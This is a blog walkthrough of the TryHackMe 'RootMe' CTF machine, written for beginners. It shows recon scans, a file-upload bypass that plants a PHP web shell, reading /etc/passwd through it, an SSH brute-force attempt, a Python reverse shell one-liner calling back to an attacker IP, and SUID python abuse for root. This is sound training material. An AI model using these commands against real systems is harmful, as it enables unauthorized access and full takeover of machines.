<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="TryHackMe - Root Me"><meta itemprop=description content="Premise RootMe is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.
Throughout this walkthrough you&rsquo;ll see reference to $target which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse."><meta itemprop=datePublished content="2022-10-03T00:00:00+00:00"><meta itemprop=dateModified content="2022-10-03T00:00:00+00:00"><meta itemprop=wordCount content="1089"><meta itemprop=keywords content="ctf,"><meta property="og:title" content="TryHackMe - Root Me"><meta property="og:description" content="Premise RootMe is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.
Throughout this walkthrough you&rsquo;ll see reference to $target which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse."><meta property="og:type" content="article"><meta property="og:url" content="https://www.maclaren.dev/posts/2022-10/thm_rootme/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-10-03T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe - Root Me"><meta name=twitter:description content="Premise RootMe is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.
Throughout this walkthrough you&rsquo;ll see reference to $target which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>TryHackMe - Root Me</title><link rel=stylesheet href=https://www.maclaren.dev/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://www.maclaren.dev>Logan MacLaren</a></div><nav class="site-nav hide-in-mobile"><a href=https://www.maclaren.dev/posts/>Blog</a></nav></div><div class="hdr-right hdr-icons"><button id=toc-btn class="hdr-btn desktop-only-ib" title="Table of Contents"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3" y2="6"/><line x1="3" y1="12" x2="3" y2="12"/><line x1="3" y1="18" x2="3" y2="18"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://www.linkedin.com/in/loganmaclaren/ target=_blank rel="noopener me" title=Linkedin><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://github.com/maclarel target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://infosec.exchange/@gill3tt3 target=_blank rel="noopener me" title=Mastodon><svg xmlns="http://www.w3.org/2000/svg" class="feather feather-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://www.maclaren.dev/posts/>Blog</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Oct 3, 2022</span></div><h1>TryHackMe - Root Me</h1></header><div class=content><h1 id=premise>Premise<a href=#premise class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p><code>RootMe</code> is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.</p><p>Throughout this walkthrough you&rsquo;ll see reference to <code>$target</code> which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.</p><h1 id=recon>Recon<a href=#recon class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>A good place to start is to see what the target machine is running, both for services and OS. We can do this by running <code>nmap</code> against it with a few flags:</p><pre><code>sudo nmap -p- -sV -sC -vvv -o nmap.out $target
</code></pre><p>This will scan the full port range of the box, try to determine versions, run default scripts against the target, and dump our output to <code>nmap.out</code>. This isn&rsquo;t something you&rsquo;d probably want to do against a target in a pen test as it will be painfully obvious what you&rsquo;re doing, but for the puposes of these challenges it&rsquo;s just fine.</p><p>This scan shows us that we&rsquo;ve got TCP 22 (SSH) and 80 (HTTP) open on the target machine, and that it&rsquo;s running Apache 2.4.29.</p><p>With these two pieces of information available, next steps would be to see what SSH authentication mechanisms the server can provide, as well as fuzzing the web server to see what directories (and possibly hostnames) it responds on.</p><pre><code># Determine what auth types we see
$ ssh -vvv $target

# Fuzz the webserver to see what content may be available
$ ffuf -u http://$target/FUZZ -w ~/gh/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p>The SSH check shows us that the server will accept password based auth, or public key authentication. Let&rsquo;s keep an eye out for private key files, the ability to add a key to <code>authorized_keys</code> for a user, or hints that we can find a password. We can always brute force, and we may need to later, but that&rsquo;s often not ideal.</p><p>Fuzzing the webserver shows us the following directories:</p><ul><li>/uploads (this is interesting)</li><li>/panel (also interesting)</li><li>/js</li><li>/css</li></ul><p><code>uploads</code> redirects to <code>panel</code> which prompts us to uploada file. That&rsquo;ll be the next thing to play around with - see what the site does when we send it data we control.</p><h1 id=what-can-we-upload>What can we upload?<a href=#what-can-we-upload class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Seemingly anything. The first attempt here is to upload a random file, and that&rsquo;s met with <code>O arquivo foi upado com sucesso!</code> which roughly translates to <code>File successfully uploaded!</code>.</p><p>We don&rsquo;t get a path for the uploaded file returned, however, making this slightly less useful. Let&rsquo;s take a closer look at the upload, and response, by capturing the traffic with Burp Suite (or similar tool).</p><p>The upload:</p><pre><code>POST /panel/ HTTP/1.1
Host: 10.10.186.89
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------20201163193198834099211560924
Content-Length: 354
Origin: http://10.10.186.89
DNT: 1
Connection: close
Referer: http://10.10.186.89/panel/
Cookie: PHPSESSID=kdmm74iroebpfj9612h6vrjou5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;bar&quot;
Content-Type: application/octet-stream

foo

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name=&quot;submit&quot;

Upload
-----------------------------20201163193198834099211560924--
</code></pre><p>While the response doesn&rsquo;t give us anything overly interesting, since we know the filename, and the directory structure on the taret, we can make some assumptions. We&rsquo;ve uploaded a file called <code>bar</code>&mldr; let&rsquo;s see if it exists at <code>http://$target/uploads/bar</code> - it does!</p><p>The other piece of information we see here is that there&rsquo;s a <code>PHPSESSID</code> cookie, so we can assume the server is <em>probably</em> running PHP. Since we have arbitrary file upload capability, and we know where the file will land, maybe we can upload a <a href=https://en.wikipedia.org/wiki/Web_shell>web shell</a> like <a href=https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985>this one</a>.</p><p>The website prevents us from uploading a file with the <code>.php</code> extension, so let&rsquo;s try bypassing that by just uploading it as an <code>html</code> file (e.g. <code>shell.html</code>). That works, but our shell doesn&rsquo;t seem to be able to actually run any commands. What if we try another PHP file extension like <code>.phar</code>? Bingo.</p><pre><code>curl http://10.10.186.89/uploads/shell.phar\?cmd\=whoami
&lt;html&gt;
&lt;body&gt;
&lt;form method=&quot;GET&quot; name=&quot;shell.phar&quot;&gt;
&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;
www-data
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h1 id=running-commmands>Running commmands<a href=#running-commmands class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Now that we&rsquo;ve got a way to poke around on the remote machine, let&rsquo;s see if we can find our first flag, and then a way to get direct access. I want to start by exploring the file system - seeing where I am with <code>pwd</code>, and dumping directory contents with <code>ls</code>. I also want to see what other users we have on the system, so that we can start to try to gain access as one of them:</p><pre><code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fetc%2Fpasswd
</code></pre><p>Removing the users with no shell, or that we&rsquo;re not interested in, we get the following:</p><pre><code>root❌0:0:root:/root:/bin/bash
rootme❌1000:1000:RootMe:/home/rootme:/bin/bash
test❌1001:1001:,,,:/home/test:/bin/bash
</code></pre><p>This recon also leads us to our first flag under <code>/var/www/</code> which we can retrieve with <code>http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fvar%2Fwww%2Fuser.txt</code>.</p><h1 id=persistence>Persistence<a href=#persistence class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Let&rsquo;s see if we can find anything under <code>/home/test</code> or <code>/home/rootme</code>. Nope, <code>ls</code> on either directory returns nothing, so they&rsquo;re either empty or more likely we don&rsquo;t have permission to see anything. While there&rsquo;s no luck on that front, perhaps we can brute force a password for SSH access with <code>Hydra</code>:</p><p>I&rsquo;m going to start with the <code>test</code> user, and the <code>RockYou</code> wordlist:</p><pre><code>hydra -l test -p ~/tools/rockyou.txt ssh://$target
</code></pre><p>No luck here, but maybe there are some other options. We could look at a few possibilities here:</p><ul><li>We can look for some other interesting privilege escalation mechanisms like binaries with the SUID bit, which may just give us root acces (<code>find / -user root -perm -4000</code>).</li><li>Since we can run arbitrary commands, we can probably get a reverse shell.</li><li>We know we can upload files and run arbitrary commands, so we could load something like <code>linpeas</code> or <code>linenum</code>.</li></ul><p>Checking the SUID binaries first, we can see a pretty normal list, however this also includes <code>/usr/bin/python</code> which it definitely shouldn&rsquo;t&mldr; Can we run commands as <code>root</code> simply by invoking them through <code>python</code>?</p><p>Let&rsquo;s try to pop a <a href=https://www.revshells.com/>reverse shell</a> from the <code>root</code> user. This will mean we need to set up a listener on our machine - <code>nc -l 9001</code> - and then spawn the connection from the remote machine to us:</p><pre><code>export RHOST=&quot;10.13.41.1&quot;;export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)'
</code></pre><p>This gets us a reverse shell, but it&rsquo;s still running as the <code>www-data</code> user. Let&rsquo;s try using Python directly to get us a root shell since it has the ability to do so in this challenge:</p><pre><code>$ python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
# whoami
whoami
root
</code></pre><p>GG!</p></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://www.maclaren.dev/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>1089 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-10-03 00:00 +0000</p></footer></article><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents></nav></aside><div class="post-nav thin"><a class=next-post href=https://www.maclaren.dev/posts/2022-11/make_a_ctf/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>Contributing to a CTF event</span></a>
<a class=prev-post href=https://www.maclaren.dev/posts/2022-09/htb_trick/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>HackTheBox - Trick</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://www.maclaren.dev>Logan MacLaren</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a> &#183; <a rel=me href=https://infosec.exchange/@gill3tt3>Mastodon</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://www.maclaren.dev/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://www.maclaren.dev/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script></body></html>